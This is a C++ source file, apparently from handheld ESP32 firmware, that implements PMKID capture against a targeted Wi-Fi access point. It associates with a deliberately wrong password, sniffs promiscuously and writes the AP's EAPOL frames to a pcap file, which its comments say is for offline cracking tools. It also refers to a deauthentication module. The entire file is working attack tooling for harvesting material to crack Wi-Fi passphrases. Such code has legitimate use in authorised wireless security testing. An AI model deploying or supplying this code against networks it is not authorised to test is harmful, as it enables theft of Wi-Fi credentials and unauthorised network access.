#include "PmkidManager.h"
#include "DeauthManager.h"  // parseMacString - shared free function
#include "../net/EapolWire.h"
#include "../net/WifiManager.h"
#include "../storage/SdCard.h"
#include "../storage/PcapWriter.h"
#include <WiFi.h>
#include <cstring>

PmkidManager g_pmkidManager;

void PmkidManager::begin(QueueHandle_t outQueue) {
    _outQueue = outQueue;
}

bool PmkidManager::start(const String& ssid, const String& bssid, uint8_t channel) {
    if (_running || ssid.isEmpty()) return false;
    if (!parseMacString(bssid, _apBssid)) return false;

    _ssid = ssid;
    _channel = channel;
    _captured = 0;
    _m1Count = 0;
    _m2Count = 0;
    _pmkidSeen = false;
    WiFi.macAddress(_selfMac);

    fs::FS& fs = sdcard::exportFs();
    fs.mkdir("/handshakes");
    String safeBssid = bssid;
    safeBssid.replace(':', '-');
    _pcapPath = "/handshakes/pmkid_" + safeBssid + "_" + String(millis() / 1000) + ".pcap";

    _captureQueue = xQueueCreate(kCaptureQueueDepth, sizeof(CapturedFrame));
    if (!_captureQueue) return false;

    _running = true;
    notify("PMKID capture: associating to " + ssid + " (no deauth)");
    if (xTaskCreatePinnedToCore(&PmkidManager::taskEntry, "pmkid", 8192, this, 1, nullptr, 0) != pdPASS) {
        // Task never started (out of memory) - unwind the capture queue
        // and the running flag so the UI doesn't sit on a dead session.
        _running = false;
        vQueueDelete(_captureQueue);
        _captureQueue = nullptr;
        notify("start failed - out of memory");
        return false;
    }
    return true;
}

void PmkidManager::taskEntry(void* arg) {
    static_cast<PmkidManager*>(arg)->run();
    vTaskDelete(nullptr);
}

void PmkidManager::run() {
    esp_wifi_set_promiscuous_rx_cb(&PmkidManager::promiscuousRxTrampoline);
    esp_wifi_set_promiscuous(true);

    fs::FS& fs = sdcard::exportFs();
    File f = fs.open(_pcapPath, "w");
    bool haveFile = (bool)f;
    if (haveFile) pcap::writeGlobalHeader(f);

    // Deliberately wrong password - this device never tries to guess
    // the real one. The point isn't to actually connect: it's that the
    // AP's very first EAPOL message (sent before it has any idea the
    // password will turn out to be wrong) is often enough to carry the
    // PMKID. WiFi.begin() with an explicit channel+bssid targets this
    // one AP precisely, rather than whatever else nearby happens to
    // share its SSID.
    WiFi.begin(_ssid.c_str(), "cardputer-pmkid-probe", _channel, _apBssid, /*connect=*/true);

    uint32_t start = millis();
    CapturedFrame frame;
    while (_running && (millis() - start) < kCaptureWindowMs) {
        if (xQueueReceive(_captureQueue, &frame, pdMS_TO_TICKS(50)) == pdTRUE) {
            _captured++;
            if (haveFile) pcap::writeRecord(f, frame.data, frame.capturedLen, frame.originalLen);
        }
    }

    esp_wifi_set_promiscuous(false);
    if (haveFile) f.close();
    vQueueDelete(_captureQueue);
    _captureQueue = nullptr;

    WiFi.disconnect(true);
    notify(pmkidLikelyCaptured() ? "PMKID likely captured!" : "capture done, no PMKID seen");
    notify("reconnecting to your own network");
    g_wifi.autoConnect();  // no-op if nothing is saved; otherwise rejoins the MRU-front saved network

    _running = false;
}

void PmkidManager::promiscuousRxTrampoline(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    auto* pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
    if (!pkt) return;
    g_pmkidManager.onCapturedFrame(pkt->payload, pkt->rx_ctrl.sig_len);
}

void PmkidManager::onCapturedFrame(const uint8_t* p, uint16_t len) {
    if (len < 22 || !_captureQueue) return;

    const uint8_t* addr1 = p + 4;
    const uint8_t* addr2 = p + 10;
    const uint8_t* addr3 = p + 16;

    // Anything involving the target AP or our own STA - broad on
    // purpose, same reasoning as DeauthManager's capture filter: every
    // matching frame still goes into the pcap verbatim regardless of
    // what it structurally looks like below, so the offline tools
    // always get the full picture, not just what this firmware could
    // classify.
    bool involvesTarget = memcmp(addr1, _apBssid, 6) == 0 || memcmp(addr2, _apBssid, 6) == 0 ||
                           memcmp(addr3, _apBssid, 6) == 0 || memcmp(addr1, _selfMac, 6) == 0 ||
                           memcmp(addr2, _selfMac, 6) == 0;
    if (!involvesTarget) return;

    // Structural read-out on the FULL frame, before the 256-byte
    // truncation below - a PMKID KDE could in principle land past that
    // cutoff. See net/EapolWire.h for exactly what is and isn't read.
    eapol::Classification c = eapol::classify(p, len);
    if (c.kind == eapol::MessageKind::Message1) {
        _m1Count++;
        if (c.hasPmkidKde) _pmkidSeen = true;
    } else if (c.kind == eapol::MessageKind::Message2) {
        _m2Count++;
    }

    CapturedFrame frame;
    frame.originalLen = len;
    frame.capturedLen = (len > sizeof(frame.data)) ? (uint16_t)sizeof(frame.data) : len;
    memcpy(frame.data, p, frame.capturedLen);
    xQueueSend(_captureQueue, &frame, 0);
}

void PmkidManager::notify(const String& text) {
    if (!_outQueue) return;
    ScanNotification n;
    n.source = ScanSource::Pmkid;
    n.type = ScanEventType::LogLine;
    n.setText(text.c_str());
    xQueueSend(_outQueue, &n, 0);
}
